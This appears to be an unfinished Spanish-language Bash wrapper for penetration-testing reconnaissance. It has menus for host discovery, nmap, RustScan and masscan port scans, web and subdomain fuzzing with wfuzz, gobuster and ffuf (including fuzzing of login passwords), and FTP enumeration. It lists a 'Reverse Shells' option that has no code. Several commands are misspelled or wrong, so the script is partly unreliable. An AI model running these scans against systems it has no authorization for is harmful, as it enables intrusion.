#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
greyColour="\e[0;37m\033[1m"

# Title
figlet "Artemis" | lolcat -a -s 1000

function ctrl_c() {
    echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
    tput cnorm && exit 1
}

# Ctrl + C
trap ctrl_c INT

#--------------------------------------------------------------------------------------

# Índice

#--------------------------------------------------------------------------------------

echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
echo -e "\t${purpleColour}1)${endColour}${greyColour} Descubrimiento de Hosts ++${endColour}"
echo -e "\t${purpleColour}2)${endColour}${greyColour} Análisis de puertos y servicios ++${endColour}"
echo -e "\t${purpleColour}3)${endColour}${greyColour} Descubrimiento de subdominios y directorios ++${endColour}"
echo -e "\t${purpleColour}4)${endColour}${greyColour} Enumeración de Servicios ++${endColour}"
echo -e "\t${purpleColour}5)${endColour}${greyColour} Enumeración de Gestores de Contenido ++${endColour}"
echo -e "\t${purpleColour}6)${endColour}${greyColour} Reverse Shells${endColour}"

echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
read option

#--------------------------------------------------------------------------------------

# Función para volver al index

#--------------------------------------------------------------------------------------

function index() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} Descubrimiento de Hosts${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} Análisis de puertos y servicios${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} Descubrimiento de subdominios y directorios${endColour}"
    echo -e "\t${purpleColour}4)${endColour}${greyColour} Enumeración de Servicios${endColour}"
    echo -e "\t${purpleColour}5)${endColour}${greyColour} Enumeración de Gestores de Contenido${endColour}"
    echo -e "\t${purpleColour}6)${endColour}${greyColour} Reverse Shells${endColour}"

    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
    read option

}
#--------------------------------------------------------------------------------------

# (I) Todas las funciones de la rama index

#--------------------------------------------------------------------------------------


#---------------------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------------------


#--------------------------------------------------------------------------------------

# (1) Apartado de Descubrimiento de Hosts

#--------------------------------------------------------------------------------------

function HostIndex() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Descubrimiento de Hosts:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} fping${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} Nmap Ping Sweep${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} Arp-Scan${endColour}"
    echo -e "\t${purpleColour}4)${endColour}${greyColour} NetDiscover${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige la herramienta a usar: ${endColour}"
    read option1

    function fpingHosts() {
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP Range ( Example: 10.10.10.0/8 )?: ${endColour}"
        read ipAddress

        echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de hosts en el rango de IPs ${turquoiseColour}$ipAddress ${endColour}con fping...${endColour}\n"

        fping -a -g $ipAddress 2>/dev/null
    }

    function nmapHosts() {
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP Range ( Example: 10.10.10.0/8 )?: ${endColour}"
        read ipAddress

        echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de hosts en el rango de IPs ${turquoiseColour}$ipAddress ${endColour} con Nmap...${endColour}\n"

        nmap -sn $ipAddress | grep -oP '(?<=Nmap scan report for )[^ ]*'
    }

    function arpHosts() {
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP Range ( Example: 10.10.10.0/8 )?: ${endColour}"
        read ipAddress

        echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de hosts en el rango de IPs ${turquoiseColour}$ipAddress ${endColour} con arp-scan...${endColour}\n"

        sudo arp-scan $ipAddress
    }

    function netdiscoverHosts() {
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP Range ( Example: 10.10.10.0/8 )?: ${endColour}"
        read ipAddress

        echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de hosts en el rango de IPs ${turquoiseColour}$ipAddress ${endColour} con Netdiscover...${endColour}\n"

        sudo netdiscover -r $ipAddress
    }

#--------------------------------------------------------------------------------------

# Apartado de Redireccionamiento de funciones del Descubrimiento de Hosts

#--------------------------------------------------------------------------------------

    if [ $option1 -eq 1 ]; then
        fpingHosts
    elif [ $option1 -eq 2 ]; then
        nmapHosts
    elif [ $option1 -eq 3 ]; then
        arpHosts
    elif [ $option1 -eq 4 ]; then
        netdiscoverHosts
    elif [ $option1 -eq 99 ]; then
        index
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi
}


#---------------------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------------------


#--------------------------------------------------------------------------------------

# (2) Apartado del Análisis de puertos y servicios

#--------------------------------------------------------------------------------------

function PortServScan() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Análisis de puertos y servicios:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} Nmap${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} RustScan (CTFs)${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} MassScan${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige la herramienta a usar: ${endColour}"
    read option2

#--------------------------------------------------------------------------------------

# Apartado Nmap del Análisis de puertos y servicios

#--------------------------------------------------------------------------------------

    function nmapPortsServ() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} AutoScan${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Escaneo TCP rápido y silencioso ( -sS --min-rate 5000 && -oG AllPorts )${endColour}"
        echo -e "\t${purpleColour}3)${endColour}${greyColour} Escaneo UDP rápido y silencioso ( -sS --min-rate 5000 && -oG AllPorts )${endColour}"
        echo -e "\t${purpleColour}4)${endColour}${greyColour} Escaneo de versiones con scripts ( -sCV -oN targeted )${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read nmap2

        if [ $nmap2 -eq 1 ]; then
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP ${turquoiseColour}$ipAddress ${greyColour} con nmap...${endColour}\n"

            sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ipAddress -oG AllPorts

            extractPorts() {
                ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
                ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
                echo -e "\n[*] Extracting information...\n" >extractPorts.tmp
                echo -e "\t[*] IP Address: $ip_address" >>extractPorts.tmp
                echo -e "\t[*] Open ports: $ports\n" >>extractPorts.tmp
                echo $ports | tr -d '\n' | xclip -sel clip
                echo -e "[*] Ports copied to clipboard\n" >>extractPorts.tmp
                bat extractPorts.tmp
                rm extractPorts.tmp
            }

            extractPorts AllPorts

            $ports=$(xlcip -o)

            sudo nmap -sCV -p$ports $ipAddress -oN targeted

        elif [ $nmap2 -eq 2 ]; then # TCP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Realizando un escaneo TCP de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con nmap...${endColour}\n"

            echo -e "${greyColour} nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ipAddress ${endColour}\n"

            sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ipAddress

        elif [ $nmap2 -eq 3 ]; then # UDP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP $ipAddress ${endColour}${turquoiseColour}$ipAddress ${endColour} con nmap...${endColour}\n"

            echo -e "${greyColour} nmap -p- --open -sU -sS --min-rate 5000 -vvv -n -Pn $ipAddress ${endColour}\n"

            sudo map -p- --open -sU -sS --min-rate 5000 -vvv -n -Pn $ipAddress

        elif [ $nmap2 -eq 4 ]; then # Versiones & Scripts
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Puertos encontrados?: ${endColour}"
            read port

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de versiones con scripts de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con nmap...${endColour}\n"

            echo -e "${greyColour} nmap -p$port -sCV $ipAddress -oN targeted ${endColour}\n"

            sudo nmap -p$port -sCV $ipAddress -oN targeted

        elif [ $nmap2 -eq 99 ]; then
            PortServScan
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

#--------------------------------------------------------------------------------------

# Apartado RustScan del Análisis de puertos y servicios

#--------------------------------------------------------------------------------------

    function RustScanPortServ() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} Escaneo TCP super-rápido ${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Escaneo UDP super-rápido ${endColour}"
        echo -e "\t${purpleColour}3)${endColour}${greyColour} Escaneo con scripts super-rápido${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read rustscan2

        if [ $rustscan2 -eq 1 ]; then # TCP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP ${turquoiseColour}$ipAddress ${greyColour} con RustScan...${endColour}\n"

            echo -e "${greyColour} rustscan -a $ipAddress --range 1-65535 ${endColour}\n"

            sudo /opt/rustscan-2.3.0-x86_64-linux/rustscan -a $ipAddress --range 1-65535

        elif [ $rustscan2 -eq 2 ]; then # UDP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Realizando un escaneo UDP de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con RustScan...${endColour}\n"

            echo -e "${greyColour} rustscan -a $ipAddress --range 1-65535 --udp${endColour}\n"

            sudo /opt/rustscan-2.3.0-x86_64-linux/rustscan -a $ipAddress --range 1-65535 --udp

        elif [ $rustscan2 -eq 3 ]; then # Scripts
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP $ipAddress ${endColour}${turquoiseColour}$ipAddress ${endColour} con RustScan...${endColour}\n"

            echo -e "${greyColour}${endColour}\n"

            sudo /opt/rustscan-2.3.0-x86_64-linux/rustscan -a $ipAddress --range 1-65535 --scripts default

        elif [ $rustscan2 -eq 99 ]; then
            PortServScan
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

#--------------------------------------------------------------------------------------

# Apartado Masscan del Análisis de puertos y servicios

#--------------------------------------------------------------------------------------

    function MassScanPortServ() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} Escaneo TCP Semi silencioso y rápido${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Escaneo UDP Semi silencioso y rápido${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read masscan2

        if [ $masscan2 -eq 1 ]; then # TCP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Realizando un escaneo UDP de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con Masscan...${endColour}\n"

            echo -e "${greyColour} masscan --open-only -p 1-65535 --rate 100000 -sS -n -Pn $ipAddress ${endColour}\n"

            sudo masscan --open-only -p 1-65535 --rate 100000 -sS -n -Pn $ipAddress --output-filename scanned

        elif [ $masscan2 -eq 3 ]; then # UDP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP $ipAddress ${endColour}${turquoiseColour}$ipAddress ${endColour} con Masscan...${endColour}\n"

            echo -e "${greyColour}masscan --open-only -p U:1-65535 --rate 100000 -sS -n -Pn $ipAddress --output-filename scanned${endColour}\n"

            sudo masscan --open-only -p U:1-65535 --rate 100000 -sS -n -Pn $ipAddress --output-filename scanned

        elif [ $masscan2 -eq 99 ]; then
            PortServScan
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

#--------------------------------------------------------------------------------------

# Apartado de Redireccionamiento de funciones del Análisis de puertos y servicios

#--------------------------------------------------------------------------------------

    if [ $option2 -eq 1 ]; then
        nmapPortsServ
    elif [ $option2 -eq 2 ]; then
        RustScanPortServ
    elif [ $option2 -eq 3 ]; then
        MassScanPortServ
    elif [ $option2 -eq 99 ]; then
        index
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi
}


#---------------------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------------------


#--------------------------------------------------------------------------------------

# (3) Apartado de Descubrimiento de subdominios y directorios

#--------------------------------------------------------------------------------------

function SubDomDiscovery() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Descubrimiento de subdominios y directorios:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} Wfuzz${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} gobuster${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} fuff${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige la herramienta que quieres utilizar para fuzzear: ${endColour}"
    read option2

#--------------------------------------------------------------------------------------

# Apartado de Wfuzz para Descubrimiento de subdominios y directorios

#--------------------------------------------------------------------------------------

    function SUwfuzz() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} Fuzzing de directorios${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Fuzzing de parámetros GET${endColour}"
        echo -e "\t${purpleColour}3)${endColour}${greyColour} Fuzzing de formularios POST${endColour}"
        echo -e "\t${purpleColour}4)${endColour}${greyColour} Fuzzing de subdominios${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read wfuzz2

        if [ $wfuzz2 -eq 1 ]; then # Fuzzing de Directorios
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Host a fuzzear? (example.com): ${endColour}"
            read host

            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Tamaño de la wordlist? (small, medium, big): ${endColour}"
            read twordlist

            if [ "$twordlist" == "small" ] || [ "$twordlist" == "medium" ] || [ "$twordlist" == "big" ]; then
                echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Hilos para el fuzzeo? (50): ${endColour}"
                read threads
                echo -e "\n${purpleColour}[+]${endColour}${greyColour} Fuzzing de directorios del host ${endColour}${turquoiseColour}$host${endColour}${greyColour} con Wfuzz...${endColour}\n"

                echo -e "\n${greyColour}wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-$twordlist.txt -t $threads -v --hc 404 $host/FUZZ${endColour}\n"

                wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-$twordlist.txt -t $threads -v --hc 404 $host/FUZZ
            else
                echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
            fi

        elif [ $wfuzz2 -eq 2 ]; then # Fuzzing de Parámetros GET
            echo -e "\n${redColour}[!] Apartado no disponible${endColour}\n"

        elif [ $wfuzz2 -eq 3 ]; then # Fuzzing de formularios POST
            echo -e "\n${redColour}[!] Apartado no disponible${endColour}\n"

        elif [ $wfuzz2 -eq 4 ]; then # Fuzzing de subdominios
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Host a fuzzear? (example.com): ${endColour}"
            read host
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Tamaño de la wordlist? (5000, 20000, 110000): ${endColour}"
            read twordlist

            if [ "$twordlist" == "5000" ] || [ "$twordlist" == "20000" ] || [ "$twordlist" == "110000" ]; then
                echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Hilos para el fuzzeo? (50): ${endColour}"
                read threads
                echo -e "\n${purpleColour}[+]${endColour}${greyColour} Fuzzing de subdominios del host ${endColour}${turquoiseColour}$host${endColour}${greyColour} con Wfuzz...${endColour}\n"

                echo -e "\n${greyColour}wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-$twordlist.txt -t $threads -v --hc 404 -H "Host: FUZZ.$host" $host${endColour}\n"

                wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-$twordlist.txt -t $threads -v --hc 404 -H "Host: FUZZ.$host" $host
            else
                echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
            fi

        elif [ $wfuzz2 -eq 99 ]; then
            SubDomDiscovery
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

#--------------------------------------------------------------------------------------

# Apartado de Gobuster para Descubrimiento de subdominios y directorios

#--------------------------------------------------------------------------------------

    function SUgobuster() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} Fuzzing de directorios${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Fuzzing de subdominios${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read gobuster_option

        if [ $gobuster_option -eq 1 ]; then # Fuzzing de Directorios
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿URL a fuzzear? (http://example.com): ${endColour}"
            read url
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Tamaño de la wordlist? (small, medium, big): ${endColour}"
            read twordlist
            if [ "$twordlist" == "small" ] || [ "$twordlist" == "medium" ] || [ "$twordlist" == "big" ]; then
                echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Hilos para el fuzzeo? (50): ${endColour}"
                read threads
                echo -e "\n${purpleColour}[+]${endColour}${greyColour} Fuzzing de directorios de la URL ${endColour}${turquoiseColour}$url${endColour}${greyColour} con Gobuster...${endColour}\n"
                echo -e "\n${greyColour}gobuster dir -u $url -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-$twordlist.txt -t $threads -v${endColour}\n"
                gobuster dir -u $url -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-$twordlist.txt -t $threads -v
            else
                echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
            fi
        elif [ $gobuster_option -eq 2 ]; then # Fuzzing de subdominios
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Dominio a fuzzear? (example.com): ${endColour}"
            read domain
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Tamaño de la wordlist? (5000, 20000, 110000): ${endColour}"
            read twordlist
            if [ "$twordlist" == "5000" ] || [ "$twordlist" == "20000" ] || [ "$twordlist" == "110000" ]; then
                echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Hilos para el fuzzeo? (50): ${endColour}"
                read threads
                echo -e "\n${purpleColour}[+]${endColour}${greyColour} Fuzzing de subdominios del dominio ${endColour}${turquoiseColour}$domain${endColour}${greyColour} con Gobuster...${endColour}\n"
                echo -e "\n${greyColour}gobuster dns -d $domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-$twordlist.txt -t $threads -v${endColour}\n"
                gobuster dns -d $domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-$twordlist.txt -t $threads -v
            else
                echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
            fi
        elif [ $gobuster_option -eq 99 ]; then
            SubDomDiscovery
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

#--------------------------------------------------------------------------------------

# Apartado de ffuf para Descubrimiento de subdominios y directorios

#--------------------------------------------------------------------------------------

    function SUffuf() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} Fuzzing de directorios${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Fuzzing de parámetros GET${endColour}"
        echo -e "\t${purpleColour}3)${endColour}${greyColour} Fuzzing de formularios POST${endColour}"
        echo -e "\t${purpleColour}4)${endColour}${greyColour} Fuzzing de subdominios${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read ffuf_option

        if [ $ffuf_option -eq 1 ]; then # Fuzzing de Directorios
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿URL a fuzzear? (https://example.com): ${endColour}"
            read url
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Tamaño de la wordlist? (small, medium, big): ${endColour}"
            read twordlist
            if [ "$twordlist" == "small" ] || [ "$twordlist" == "medium" ] || [ "$twordlist" == "big" ]; then
                echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Hilos para el fuzzeo? (50): ${endColour}"
                read threads
                echo -e "\n${purpleColour}[+]${endColour}${greyColour} Fuzzing de directorios de la URL ${endColour}${turquoiseColour}$url${endColour}${greyColour} con ffuf...${endColour}\n"
                echo -e "\n${greyColour}ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-$twordlist.txt -u $url/FUZZ -t $threads -v${endColour}\n"
                ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-$twordlist.txt -u $url/FUZZ -t $threads -v
            else
                echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
            fi
        elif [ $ffuf_option -eq 2 ]; then # Fuzzing de Parámetros GET
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿URL a fuzzear? (https://example.com/?param=FUZZ): ${endColour}"
            read url
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Wordlist para los parámetros? (/path/to/wordlist): ${endColour}"
            read wordlist
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Hilos para el fuzzeo? (50): ${endColour}"
            read threads
            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Fuzzing de parámetros GET de la URL ${endColour}${turquoiseColour}$url${endColour}${greyColour} con ffuf...${endColour}\n"
            echo -e "\n${greyColour}ffuf -c -w $wordlist -u $url -t $threads -v${endColour}\n"
            ffuf -c -w $wordlist -u $url -t $threads -v
        elif [ $ffuf_option -eq 3 ]; then # Fuzzing de formularios POST
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿URL a fuzzear? (https://example.com/form): ${endColour}"
            read url
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Datos POST? (username=admin&password=FUZZ): ${endColour}"
            read post_data
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Wordlist para el fuzzeo? (/path/to/wordlist): ${endColour}"
            read wordlist
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Hilos para el fuzzeo? (50): ${endColour}"
            read threads
            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Fuzzing de formulario POST de la URL ${endColour}${turquoiseColour}$url${endColour}${greyColour} con ffuf...${endColour}\n"
            echo -e "\n${greyColour}ffuf -c -w $wordlist -u $url -X POST -d \"$post_data\" -t $threads -v${endColour}\n"
            ffuf -c -w $wordlist -u $url -X POST -d "$post_data" -t $threads -v
        elif [ $ffuf_option -eq 4 ]; then # Fuzzing de subdominios
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Dominio a fuzzear? (example.com): ${endColour}"
            read domain
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Tamaño de la wordlist? (5000, 20000, 110000): ${endColour}"
            read twordlist
            if [ "$twordlist" == "5000" ] || [ "$twordlist" == "20000" ] || [ "$twordlist" == "110000" ]; then
                echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Hilos para el fuzzeo? (50): ${endColour}"
                read threads
                echo -e "\n${purpleColour}[+]${endColour}${greyColour} Fuzzing de subdominios del dominio ${endColour}${turquoiseColour}$domain${endColour}${greyColour} con ffuf...${endColour}\n"
                echo -e "\n${greyColour}ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-$twordlist.txt -u FUZZ.$domain -t $threads -v${endColour}\n"
                ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-$twordlist.txt -u FUZZ.$domain -t $threads -v
            else
                echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
            fi
        elif [ $ffuf_option -eq 99 ]; then
            SubDomDiscovery
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

#--------------------------------------------------------------------------------------

# Apartado de Redireccionamiento de funciones del Descubrimiento de subdominios y directorios

#--------------------------------------------------------------------------------------

    if [ $option2 -eq 1 ]; then
        SUwfuzz
    elif [ $option2 -eq 2 ]; then
        SUgobuster
    elif [ $option2 -eq 3 ]; then
        SUffuf
    elif [ $option2 -eq 99 ]; then
        index
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi
}


#--------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------


#--------------------------------------------------------------------------------------

# Apartado de Enumeración de servicios

#--------------------------------------------------------------------------------------

function ServiceEnum() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Enumeración de servicios:${endColour}"
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Trabajando en implementar los demás servicios...${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} FTP(21)${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} SSH(22)${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} HTTP(80)${endColour}"
    echo -e "\t${purpleColour}4)${endColour}${greyColour} HTTPS(443)${endColour}"
    echo -e "\t${purpleColour}5)${endColour}${greyColour} SMB(139,445)${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige el servicio a enumerar: ${endColour}"
    read option4

#--------------------------------------------------------------------------------------

# Apartado de enumeración del Servicio FTP(21)

#--------------------------------------------------------------------------------------

    function SEftp() {
        # Función para verificar la existencia de una herramienta
        check_tool() {
            if ! command -v $1 &>/dev/null; then
                echo "Error: $1 no está instalado. Por favor, instálelo e inténtelo de nuevo."
                exit 1
            fi
        }

        # Verificar herramientas necesarias
        check_tool nmap
        check_tool hydra
        check_tool ftpmap

        # Solicitar dirección IP
        read -p "Introduce la dirección IP del objetivo: " ip_address

        # Verificar si la dirección IP es válida y si el servicio FTP está activo
        if ! ping -c 1 $ip_address &>/dev/null; then
            echo "Error: La dirección IP no es alcanzable."
            exit 1
        fi

        if ! nmap -p21 $ip_address | grep -q "21/tcp open"; then
            echo "Error: El servicio FTP no está activo en la dirección IP proporcionada."
            exit 1
        fi

        # Crear directorio para almacenar resultados
        results_dir="ftp_enum_results_$(date +%Y%m%d_%H%M%S)"
        mkdir $results_dir

        # Función para imprimir separadores
        print_separator() {
            echo "----------------------------------------"
        }

        # 1. Escaneo de puertos y detección de versión con nmap
        echo "Realizando escaneo de puertos y detección de versión..."
        nmap -sV -p21 $ip_address -oN $results_dir/nmap_version_scan.txt
        print_separator

        # 2. Escaneo de vulnerabilidades FTP con nmap
        echo "Realizando escaneo de vulnerabilidades FTP..."
        nmap --script ftp-* -p21 $ip_address -oN $results_dir/nmap_vuln_scan.txt
        print_separator

